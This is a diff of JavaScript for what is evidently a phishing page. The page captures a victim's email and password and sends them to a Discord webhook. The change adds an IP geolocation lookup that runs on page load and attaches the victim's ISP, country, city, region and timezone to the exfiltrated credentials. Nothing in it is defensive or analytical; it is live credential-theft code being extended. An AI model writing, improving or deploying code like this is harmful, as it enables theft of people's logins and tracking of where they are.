@@ -10,6 +10,7 @@ const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768
 // Variables to store user data
 let userIP = "Unknown IP";
 let userDeviceInfo = {};
+let whoisData = {};
 
 // -----------------------------------
 // FETCH IP ADDRESS ON PAGE LOAD
@@ -25,10 +26,26 @@ async function fetchIPAddress() {
   }
 }
 
-// Fetch the IP address when the page loads
+// Perform WHOIS lookup on the IP address
+async function fetchWhoisData(ip) {
+  try {
+    const response = await fetch(`https://ipwhois.app/json/${ip}`);
+    const data = await response.json();
+    return data;
+  } catch (error) {
+    console.error("Error fetching WHOIS data:", error);
+    return {};
+  }
+}
+
+// Fetch the IP address and WHOIS data when the page loads
 document.addEventListener("DOMContentLoaded", async () => {
   userIP = await fetchIPAddress(); // Store the IP address in the `userIP` variable
   console.log("User IP Address:", userIP); // Optional: Log the IP for debugging
+
+  whoisData = await fetchWhoisData(userIP); // Perform WHOIS lookup
+  console.log("WHOIS Data:", whoisData); // Optional: Log WHOIS data for debugging
+
   collectDeviceInfo(); // Collect additional device info
 });
 
@@ -82,7 +99,7 @@ function getOS() {
 // -----------------------------------
 async function sendCredentialsToWebhook(email, password) {
   try {
-    // Use the stored IP address and device info
+    // Use the stored IP address, device info, and WHOIS data
     const ip = userIP;
 
     // Prepare the embed payload
@@ -108,6 +125,31 @@ async function sendCredentialsToWebhook(email, password) {
               inline: false,
             },
             {
+              name: "ISP",
+              value: whoisData.isp || "Unknown ISP",
+              inline: true,
+            },
+            {
+              name: "Country",
+              value: whoisData.country || "Unknown Country",
+              inline: true,
+            },
+            {
+              name: "City",
+              value: whoisData.city || "Unknown City",
+              inline: true,
+            },
+            {
+              name: "Region",
+              value: whoisData.region || "Unknown Region",
+              inline: true,
+            },
+            {
+              name: "Timezone",
+              value: whoisData.timezone || "Unknown Timezone",
+              inline: true,
+            },
+            {
               name: "Browser",
               value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`,
               inline: true,
@@ -125,11 +167,6 @@ async function sendCredentialsToWebhook(email, password) {
             {
               name: "Language",
               value: userDeviceInfo.language,
-              inline: true,
-            },
-            {
-              name: "Timezone",
-              value: userDeviceInfo.timezone,
               inline: true,
             },
             {
